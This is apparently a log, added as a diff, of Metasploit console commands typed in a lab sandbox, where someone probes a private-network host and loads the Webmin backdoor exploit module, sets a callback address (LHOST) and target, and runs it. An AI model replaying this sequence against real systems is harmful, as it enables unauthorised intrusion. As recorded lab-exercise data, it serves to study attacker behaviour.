@@ -1,0 +1,25 @@
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:38:20.872346+02:00", "cmd_type": "msf-command", "cmd": "show missing"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:39:31.386648+02:00", "cmd_type": "msf-command", "cmd": "show targets"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:40:02.883727+02:00", "cmd_type": "msf-command", "cmd": "check 172.18.1.5"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:40:24.566019+02:00", "cmd_type": "msf-command", "cmd": "show targets"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:40:50.939168+02:00", "cmd_type": "msf-command", "cmd": "show options"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:41:16.882718+02:00", "cmd_type": "msf-command", "cmd": "set target 0"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:41:20.135987+02:00", "cmd_type": "msf-command", "cmd": "show options"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:42:21.644838+02:00", "cmd_type": "msf-command", "cmd": "run"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:43:39.198830+02:00", "cmd_type": "msf-command", "cmd": "check 172.18.1.5"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:43:59.473976+02:00", "cmd_type": "msf-command", "cmd": "back"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:44:08.883128+02:00", "cmd_type": "msf-command", "cmd": "use exploit/linux/http/webmin_backdoor.rb"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:44:19.138374+02:00", "cmd_type": "msf-command", "cmd": "check 172.18.1.5"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:44:29.116746+02:00", "cmd_type": "msf-command", "cmd": "show options"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:44:57.142251+02:00", "cmd_type": "msf-command", "cmd": "show targets"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:46:49.114570+02:00", "cmd_type": "msf-command", "cmd": "set target 1"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:47:13.029939+02:00", "cmd_type": "msf-command", "cmd": "check 172.18.1.5"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:48:06.006184+02:00", "cmd_type": "msf-command", "cmd": "exit"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:49:24.772851+02:00", "cmd_type": "msf-command", "cmd": "use exploit/linux/http/webmin_backdoor"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:49:34.640170+02:00", "cmd_type": "msf-command", "cmd": "show targets"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:49:41.718514+02:00", "cmd_type": "msf-command", "cmd": "show options"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:50:09.152122+02:00", "cmd_type": "msf-command", "cmd": "check 172.18.1.5"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:51:48.472686+02:00", "cmd_type": "msf-command", "cmd": "set LHOST 10.1.135.83"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:51:54.609785+02:00", "cmd_type": "msf-command", "cmd": "check 172.18.1.5"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:52:04.703954+02:00", "cmd_type": "msf-command", "cmd": "run"}
+{"sandbox_id": "54", "timestamp_str": "2020-07-15T10:52:44.206917+02:00", "cmd_type": "msf-command", "cmd": "set RHOSTS 172.18.1.5"}
